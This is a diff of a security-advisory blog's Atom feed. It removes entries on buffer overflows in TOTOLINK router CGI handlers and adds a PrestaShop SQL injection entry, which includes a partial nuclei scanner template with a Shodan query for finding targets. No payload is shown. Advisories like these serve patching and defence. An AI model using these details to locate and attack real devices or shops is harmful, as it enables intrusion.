@@ -42,131 +42,6 @@
   </entry>
   
   <entry>
-    <title>A vulnerability was found in TOTOLINK T10 418cu5207 It has been classified as critical</title>
-    <link href="http://example.com/2025/06/10/github_3511379987/"/>
-    <id>http://example.com/2025/06/10/github_3511379987/</id>
-    <published>2025-06-10T06:29:30.925Z</published>
-    <updated>2025-06-10T06:29:30.920Z</updated>
-    
-    <content type="html"><![CDATA[<p>**链接: ** <a href="https://github.com/advisories/GHSA-pwwc-x5p3-pqjj">https://github.com/advisories/GHSA-pwwc-x5p3-pqjj</a></p><p>**CVSS 评分: ** 8.8</p><p><strong>参考链接</strong>:</p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5903">https://nvd.nist.gov/vuln/detail/CVE-2025-5903</a></p></li><li><p><a href="https://candle-throne-f75.notion.site/TOTOLINK-T10-setWiFiAclRules-20bdf0aa118580399a8df6ba2a44c197">https://candle-throne-f75.notion.site/TOTOLINK-T10-setWiFiAclRules-20bdf0aa118580399a8df6ba2a44c197</a></p></li><li><p><a href="https://vuldb.com/?ctiid.311676">https://vuldb.com/?ctiid.311676</a></p></li><li><p><a href="https://vuldb.com/?id.311676">https://vuldb.com/?id.311676</a></p></li><li><p><a href="https://vuldb.com/?submit.592247">https://vuldb.com/?submit.592247</a></p></li><li><p><a href="https://www.totolink.net/">https://www.totolink.net</a></p></li><li><p><a href="https://github.com/advisories/GHSA-pwwc-x5p3-pqjj">https://github.com/advisories/GHSA-pwwc-x5p3-pqjj</a></p></li></ul><p>**描述: **</p><p>A vulnerability was found in TOTOLINK T10 4.1.8cu.5207. It has been classified as critical. Affected is the function setWiFiAclRules of the file &#x2F;cgi-bin&#x2F;cstecgi.cgi of the component POST Request Handler. The manipulation of the argument desc leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-pwwc-x5p3-pqjj&quot;&gt;https://github.com/advisories/GHSA-pwwc-x5p3-pqjj&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;**CVSS </summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>A vulnerability was found in TOTOLINK T10 418cu5207 and classified as critical This issue</title>
-    <link href="http://example.com/2025/06/10/github_2932792177/"/>
-    <id>http://example.com/2025/06/10/github_2932792177/</id>
-    <published>2025-06-10T06:29:30.605Z</published>
-    <updated>2025-06-10T06:29:30.600Z</updated>
-    
-    <content type="html"><![CDATA[<p>**链接: ** <a href="https://github.com/advisories/GHSA-6mq6-6457-rccm">https://github.com/advisories/GHSA-6mq6-6457-rccm</a></p><p>**CVSS 评分: ** 8.8</p><p><strong>参考链接</strong>:</p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5902">https://nvd.nist.gov/vuln/detail/CVE-2025-5902</a></p></li><li><p><a href="https://candle-throne-f75.notion.site/TOTOLINK-T10-setUpgradeFW-20bdf0aa11858089bc28f634bb140d00">https://candle-throne-f75.notion.site/TOTOLINK-T10-setUpgradeFW-20bdf0aa11858089bc28f634bb140d00</a></p></li><li><p><a href="https://vuldb.com/?ctiid.311675">https://vuldb.com/?ctiid.311675</a></p></li><li><p><a href="https://vuldb.com/?id.311675">https://vuldb.com/?id.311675</a></p></li><li><p><a href="https://vuldb.com/?submit.592246">https://vuldb.com/?submit.592246</a></p></li><li><p><a href="https://www.totolink.net/">https://www.totolink.net</a></p></li><li><p><a href="https://github.com/advisories/GHSA-6mq6-6457-rccm">https://github.com/advisories/GHSA-6mq6-6457-rccm</a></p></li></ul><p>**描述: **</p><p>A vulnerability was found in TOTOLINK T10 4.1.8cu.5207 and classified as critical. This issue affects the function setUpgradeFW of the file &#x2F;cgi-bin&#x2F;cstecgi.cgi of the component POST Request Handler. The manipulation of the argument slaveIpList leads to buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-6mq6-6457-rccm&quot;&gt;https://github.com/advisories/GHSA-6mq6-6457-rccm&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;**CVSS </summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>A vulnerability has been found in TOTOLINK T10 418cu5207 and classified as critical This</title>
-    <link href="http://example.com/2025/06/10/github_84218411/"/>
-    <id>http://example.com/2025/06/10/github_84218411/</id>
-    <published>2025-06-10T06:29:30.295Z</published>
-    <updated>2025-06-10T06:29:30.292Z</updated>
-    
-    <content type="html"><![CDATA[<p>**链接: ** <a href="https://github.com/advisories/GHSA-jfcx-jqxf-6323">https://github.com/advisories/GHSA-jfcx-jqxf-6323</a></p><p>**CVSS 评分: ** 8.8</p><p><strong>参考链接</strong>:</p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5901">https://nvd.nist.gov/vuln/detail/CVE-2025-5901</a></p></li><li><p><a href="https://candle-throne-f75.notion.site/TOTOLINK-T10-UploadCustomModule-20bdf0aa118580d59961cd545582c118">https://candle-throne-f75.notion.site/TOTOLINK-T10-UploadCustomModule-20bdf0aa118580d59961cd545582c118</a></p></li><li><p><a href="https://vuldb.com/?ctiid.311674">https://vuldb.com/?ctiid.311674</a></p></li><li><p><a href="https://vuldb.com/?id.311674">https://vuldb.com/?id.311674</a></p></li><li><p><a href="https://vuldb.com/?submit.592243">https://vuldb.com/?submit.592243</a></p></li><li><p><a href="https://www.totolink.net/">https://www.totolink.net</a></p></li><li><p><a href="https://github.com/advisories/GHSA-jfcx-jqxf-6323">https://github.com/advisories/GHSA-jfcx-jqxf-6323</a></p></li></ul><p>**描述: **</p><p>A vulnerability has been found in TOTOLINK T10 4.1.8cu.5207 and classified as critical. This vulnerability affects the function UploadCustomModule of the file &#x2F;cgi-bin&#x2F;cstecgi.cgi of the component POST Request Handler. The manipulation of the argument File leads to buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-jfcx-jqxf-6323&quot;&gt;https://github.com/advisories/GHSA-jfcx-jqxf-6323&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;**CVSS </summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>A vulnerability was found in TOTOLINK T10 418cu5207 It has been declared as critical</title>
-    <link href="http://example.com/2025/06/10/github_1435835657/"/>
-    <id>http://example.com/2025/06/10/github_1435835657/</id>
-    <published>2025-06-10T06:29:29.971Z</published>
-    <updated>2025-06-10T06:29:29.968Z</updated>
-    
-    <content type="html"><![CDATA[<p>**链接: ** <a href="https://github.com/advisories/GHSA-m742-x7cw-3g4q">https://github.com/advisories/GHSA-m742-x7cw-3g4q</a></p><p>**CVSS 评分: ** 8.8</p><p><strong>参考链接</strong>:</p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5904">https://nvd.nist.gov/vuln/detail/CVE-2025-5904</a></p></li><li><p><a href="https://candle-throne-f75.notion.site/TOTOLINK-T10-setWiFiMeshName-20bdf0aa1185806eb922dbd496c4a4b4">https://candle-throne-f75.notion.site/TOTOLINK-T10-setWiFiMeshName-20bdf0aa1185806eb922dbd496c4a4b4</a></p></li><li><p><a href="https://vuldb.com/?ctiid.311677">https://vuldb.com/?ctiid.311677</a></p></li><li><p><a href="https://vuldb.com/?id.311677">https://vuldb.com/?id.311677</a></p></li><li><p><a href="https://vuldb.com/?submit.592264">https://vuldb.com/?submit.592264</a></p></li><li><p><a href="https://www.totolink.net/">https://www.totolink.net</a></p></li><li><p><a href="https://github.com/advisories/GHSA-m742-x7cw-3g4q">https://github.com/advisories/GHSA-m742-x7cw-3g4q</a></p></li></ul><p>**描述: **</p><p>A vulnerability was found in TOTOLINK T10 4.1.8cu.5207. It has been declared as critical. Affected by this vulnerability is the function setWiFiMeshName of the file &#x2F;cgi-bin&#x2F;cstecgi.cgi of the component POST Request Handler. The manipulation of the argument device_name leads to buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-m742-x7cw-3g4q&quot;&gt;https://github.com/advisories/GHSA-m742-x7cw-3g4q&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;**CVSS </summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>A vulnerability was found in TOTOLINK T10 418cu5207 It has been rated as critical Affected</title>
-    <link href="http://example.com/2025/06/10/github_1083299721/"/>
-    <id>http://example.com/2025/06/10/github_1083299721/</id>
-    <published>2025-06-10T06:29:29.645Z</published>
-    <updated>2025-06-10T06:29:29.640Z</updated>
-    
-    <content type="html"><![CDATA[<p>**链接: ** <a href="https://github.com/advisories/GHSA-r36p-hj2v-vj2h">https://github.com/advisories/GHSA-r36p-hj2v-vj2h</a></p><p>**CVSS 评分: ** 8.8</p><p><strong>参考链接</strong>:</p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5905">https://nvd.nist.gov/vuln/detail/CVE-2025-5905</a></p></li><li><p><a href="https://candle-throne-f75.notion.site/TOTOLINK-T10-setWiFiRepeaterCfg-20bdf0aa118580bd8cd0da62d4d2e47f?pvs=73">https://candle-throne-f75.notion.site/TOTOLINK-T10-setWiFiRepeaterCfg-20bdf0aa118580bd8cd0da62d4d2e47f?pvs=73</a></p></li><li><p><a href="https://vuldb.com/?ctiid.311678">https://vuldb.com/?ctiid.311678</a></p></li><li><p><a href="https://vuldb.com/?id.311678">https://vuldb.com/?id.311678</a></p></li><li><p><a href="https://vuldb.com/?submit.592265">https://vuldb.com/?submit.592265</a></p></li><li><p><a href="https://www.totolink.net/">https://www.totolink.net</a></p></li><li><p><a href="https://github.com/advisories/GHSA-r36p-hj2v-vj2h">https://github.com/advisories/GHSA-r36p-hj2v-vj2h</a></p></li></ul><p>**描述: **</p><p>A vulnerability was found in TOTOLINK T10 4.1.8cu.5207. It has been rated as critical. Affected by this issue is the function setWiFiRepeaterCfg of the file &#x2F;cgi-bin&#x2F;cstecgi.cgi of the component POST Request Handler. The manipulation of the argument Password leads to buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-r36p-hj2v-vj2h&quot;&gt;https://github.com/advisories/GHSA-r36p-hj2v-vj2h&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;**CVSS </summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
     <title>SAP Business Warehouse and SAP Plug-In Basis allows an authenticated attacker to drop arbitrary</title>
     <link href="http://example.com/2025/06/10/github_2255167076/"/>
     <id>http://example.com/2025/06/10/github_2255167076/</id>
@@ -217,31 +92,6 @@
   </entry>
   
   <entry>
-    <title>A vulnerability classified as critical was found in TOTOLINK EX1200T up to 412cu5232_B20210713</title>
-    <link href="http://example.com/2025/06/10/github_2243827768/"/>
-    <id>http://example.com/2025/06/10/github_2243827768/</id>
-    <published>2025-06-10T06:29:28.652Z</published>
-    <updated>2025-06-10T06:29:28.648Z</updated>
-    
-    <content type="html"><![CDATA[<p>**链接: ** <a href="https://github.com/advisories/GHSA-7w7w-qmvg-8559">https://github.com/advisories/GHSA-7w7w-qmvg-8559</a></p><p>**CVSS 评分: ** 8.8</p><p><strong>参考链接</strong>:</p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5907">https://nvd.nist.gov/vuln/detail/CVE-2025-5907</a></p></li><li><p><a href="https://github.com/byxs0x0/cve2/blob/main/3.md">https://github.com/byxs0x0/cve2/blob/main/3.md</a></p></li><li><p><a href="https://vuldb.com/?ctiid.311680">https://vuldb.com/?ctiid.311680</a></p></li><li><p><a href="https://vuldb.com/?id.311680">https://vuldb.com/?id.311680</a></p></li><li><p><a href="https://vuldb.com/?submit.592267">https://vuldb.com/?submit.592267</a></p></li><li><p><a href="https://www.totolink.net/">https://www.totolink.net</a></p></li><li><p><a href="https://github.com/advisories/GHSA-7w7w-qmvg-8559">https://github.com/advisories/GHSA-7w7w-qmvg-8559</a></p></li></ul><p>**描述: **</p><p>A vulnerability classified as critical was found in TOTOLINK EX1200T up to 4.1.2cu.5232_B20210713. This vulnerability affects unknown code of the file &#x2F;boafrm&#x2F;formFilter of the component HTTP POST Request Handler. The manipulation leads to buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-7w7w-qmvg-8559&quot;&gt;https://github.com/advisories/GHSA-7w7w-qmvg-8559&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;**CVSS </summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
     <title>RFC inbound processing�does not perform necessary authorization checks for an authenticated user,</title>
     <link href="http://example.com/2025/06/10/github_3078219642/"/>
     <id>http://example.com/2025/06/10/github_3078219642/</id>
@@ -254,106 +104,6 @@
       
       
     <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-p85x-xv8x-v67q&quot;&gt;https://github.com/advisories/GHSA-p85x-xv8x-v67q&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;**CVSS </summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>A vulnerability, which was classified as critical, has been found in TOTOLINK EX1200T up to 41</title>
-    <link href="http://example.com/2025/06/10/github_3055421474/"/>
-    <id>http://example.com/2025/06/10/github_3055421474/</id>
-    <published>2025-06-10T06:29:27.989Z</published>
-    <updated>2025-06-10T06:29:27.984Z</updated>
-    
-    <content type="html"><![CDATA[<p>**链接: ** <a href="https://github.com/advisories/GHSA-j52j-ph84-2j62">https://github.com/advisories/GHSA-j52j-ph84-2j62</a></p><p>**CVSS 评分: ** 8.8</p><p><strong>参考链接</strong>:</p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5908">https://nvd.nist.gov/vuln/detail/CVE-2025-5908</a></p></li><li><p><a href="https://github.com/byxs0x0/cve2/blob/main/4.md">https://github.com/byxs0x0/cve2/blob/main/4.md</a></p></li><li><p><a href="https://vuldb.com/?ctiid.311681">https://vuldb.com/?ctiid.311681</a></p></li><li><p><a href="https://vuldb.com/?id.311681">https://vuldb.com/?id.311681</a></p></li><li><p><a href="https://vuldb.com/?submit.592269">https://vuldb.com/?submit.592269</a></p></li><li><p><a href="https://www.totolink.net/">https://www.totolink.net</a></p></li><li><p><a href="https://github.com/advisories/GHSA-j52j-ph84-2j62">https://github.com/advisories/GHSA-j52j-ph84-2j62</a></p></li></ul><p>**描述: **</p><p>A vulnerability, which was classified as critical, has been found in TOTOLINK EX1200T up to 4.1.2cu.5232_B20210713. This issue affects some unknown processing of the file &#x2F;boafrm&#x2F;formIpQoS of the component HTTP POST Request Handler. The manipulation leads to buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-j52j-ph84-2j62&quot;&gt;https://github.com/advisories/GHSA-j52j-ph84-2j62&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;**CVSS </summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>A vulnerability has been found in TOTOLINK EX1200T up to 412cu5232_B20210713 and classified as</title>
-    <link href="http://example.com/2025/06/10/github_1612062170/"/>
-    <id>http://example.com/2025/06/10/github_1612062170/</id>
-    <published>2025-06-10T06:29:27.661Z</published>
-    <updated>2025-06-10T06:29:27.656Z</updated>
-    
-    <content type="html"><![CDATA[<p>**链接: ** <a href="https://github.com/advisories/GHSA-457f-pcj5-v75v">https://github.com/advisories/GHSA-457f-pcj5-v75v</a></p><p>**CVSS 评分: ** 8.8</p><p><strong>参考链接</strong>:</p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5910">https://nvd.nist.gov/vuln/detail/CVE-2025-5910</a></p></li><li><p><a href="https://github.com/byxs0x0/cve2/blob/main/6.md">https://github.com/byxs0x0/cve2/blob/main/6.md</a></p></li><li><p><a href="https://vuldb.com/?ctiid.311683">https://vuldb.com/?ctiid.311683</a></p></li><li><p><a href="https://vuldb.com/?id.311683">https://vuldb.com/?id.311683</a></p></li><li><p><a href="https://vuldb.com/?submit.592271">https://vuldb.com/?submit.592271</a></p></li><li><p><a href="https://www.totolink.net/">https://www.totolink.net</a></p></li><li><p><a href="https://github.com/advisories/GHSA-457f-pcj5-v75v">https://github.com/advisories/GHSA-457f-pcj5-v75v</a></p></li></ul><p>**描述: **</p><p>A vulnerability has been found in TOTOLINK EX1200T up to 4.1.2cu.5232_B20210713 and classified as critical. Affected by this vulnerability is an unknown functionality of the file &#x2F;boafrm&#x2F;formWsc of the component HTTP POST Request Handler. The manipulation leads to buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-457f-pcj5-v75v&quot;&gt;https://github.com/advisories/GHSA-457f-pcj5-v75v&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;**CVSS </summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>A vulnerability was found in TOTOLINK EX1200T up to 412cu5232_B20210713 and classified as</title>
-    <link href="http://example.com/2025/06/10/github_2150810134/"/>
-    <id>http://example.com/2025/06/10/github_2150810134/</id>
-    <published>2025-06-10T06:29:27.340Z</published>
-    <updated>2025-06-10T06:29:27.340Z</updated>
-    
-    <content type="html"><![CDATA[<p>**链接: ** <a href="https://github.com/advisories/GHSA-qjqq-q9g6-p92r">https://github.com/advisories/GHSA-qjqq-q9g6-p92r</a></p><p>**CVSS 评分: ** 8.8</p><p><strong>参考链接</strong>:</p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5911">https://nvd.nist.gov/vuln/detail/CVE-2025-5911</a></p></li><li><p><a href="https://github.com/byxs0x0/cve2/blob/main/7.md">https://github.com/byxs0x0/cve2/blob/main/7.md</a></p></li><li><p><a href="https://vuldb.com/?ctiid.311684">https://vuldb.com/?ctiid.311684</a></p></li><li><p><a href="https://vuldb.com/?id.311684">https://vuldb.com/?id.311684</a></p></li><li><p><a href="https://vuldb.com/?submit.592272">https://vuldb.com/?submit.592272</a></p></li><li><p><a href="https://www.totolink.net/">https://www.totolink.net</a></p></li><li><p><a href="https://github.com/advisories/GHSA-qjqq-q9g6-p92r">https://github.com/advisories/GHSA-qjqq-q9g6-p92r</a></p></li></ul><p>**描述: **</p><p>A vulnerability was found in TOTOLINK EX1200T up to 4.1.2cu.5232_B20210713 and classified as critical. Affected by this issue is some unknown functionality of the file &#x2F;boafrm&#x2F;formDMZ of the component HTTP POST Request Handler. The manipulation leads to buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-qjqq-q9g6-p92r&quot;&gt;https://github.com/advisories/GHSA-qjqq-q9g6-p92r&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;**CVSS </summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>A vulnerability, which was classified as critical, was found in TOTOLINK EX1200T up to 412cu</title>
-    <link href="http://example.com/2025/06/10/github_1361192037/"/>
-    <id>http://example.com/2025/06/10/github_1361192037/</id>
-    <published>2025-06-10T06:29:26.578Z</published>
-    <updated>2025-06-10T06:29:26.576Z</updated>
-    
-    <content type="html"><![CDATA[<p>**链接: ** <a href="https://github.com/advisories/GHSA-64c7-4r62-687q">https://github.com/advisories/GHSA-64c7-4r62-687q</a></p><p>**CVSS 评分: ** 8.8</p><p><strong>参考链接</strong>:</p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5909">https://nvd.nist.gov/vuln/detail/CVE-2025-5909</a></p></li><li><p><a href="https://github.com/byxs0x0/cve2/blob/main/5.md">https://github.com/byxs0x0/cve2/blob/main/5.md</a></p></li><li><p><a href="https://vuldb.com/?ctiid.311682">https://vuldb.com/?ctiid.311682</a></p></li><li><p><a href="https://vuldb.com/?id.311682">https://vuldb.com/?id.311682</a></p></li><li><p><a href="https://vuldb.com/?submit.592270">https://vuldb.com/?submit.592270</a></p></li><li><p><a href="https://www.totolink.net/">https://www.totolink.net</a></p></li><li><p><a href="https://github.com/advisories/GHSA-64c7-4r62-687q">https://github.com/advisories/GHSA-64c7-4r62-687q</a></p></li></ul><p>**描述: **</p><p>A vulnerability, which was classified as critical, was found in TOTOLINK EX1200T up to 4.1.2cu.5232_B20210713. Affected is an unknown function of the file &#x2F;boafrm&#x2F;formReflashClientTbl of the component HTTP POST Request Handler. The manipulation leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;**链接: ** &lt;a href=&quot;https://github.com/advisories/GHSA-64c7-4r62-687q&quot;&gt;https://github.com/advisories/GHSA-64c7-4r62-687q&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;**CVSS </summary>
       
     
@@ -529,6 +279,286 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PrestaShop possearchproducts SQL注入漏洞</title>
+    <link href="http://example.com/2025/06/10/github_1377893591/"/>
+    <id>http://example.com/2025/06/10/github_1377893591/</id>
+    <published>2025-06-10T04:45:27.112Z</published>
+    <updated>2025-06-10T04:45:27.225Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> PrestaShop possearchproducts SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-30192</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 在PosThemes为PrestaShop开发的模块“Search Products”（possearchproducts）中，受影响版本的访客可以执行SQL注入攻击。成功利用此漏洞可能导致未经授权的访问、数据泄露，以及PrestaShop应用程序及其底层数据库的潜在危害。</p><p><strong>产品厂商：</strong> PosThemes</p><p><strong>产品名称：</strong> possearchproducts</p><p><strong>影响版本：</strong> &lt;&#x3D; 1.7</p><p><strong>搜索语法：</strong> http.component:”prestashop”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/769041aa86bd1debcd54999b36e76dc9196ff495/http%2Fcves%2F2023%2FCVE-2023-30192.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/769041aa86bd1debcd54999b36e76dc9196ff495/http%2Fcves%2F2023%2FCVE-2023-30192.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">30192</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> PrestaShop possearchproducts <span class="hljs-operator">&lt;=</span> <span class="hljs-number">1.7</span> <span class="hljs-operator">-</span> SQL Injection<br>  <span class="hljs-params">author:</span> mastercho<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    In the module “Search Products” (possearchproducts) from PosThemes for PrestaShop, a guest can perform SQL injection <span class="hljs-keyword">in</span> affected versions.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation of this vulnerability can lead to unauthorized access, data leakage, and potential compromise of the PrestaShop application and its underlying database.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2023-30192</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//security.friendsofpresta.org/modules/2023/05/11/possearchproducts.html</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">30192</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">89</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.04505</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.92462</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">product:</span> possearchproducts<br>    <span class="hljs-params">framework:</span> prestashop<br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> http.component:<span class="hljs-string">&quot;prestashop&quot;</span><br>  <span class="hljs-params">tags:</span> time-based-sqli,cve2023,cve,prestashop,sqli<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span 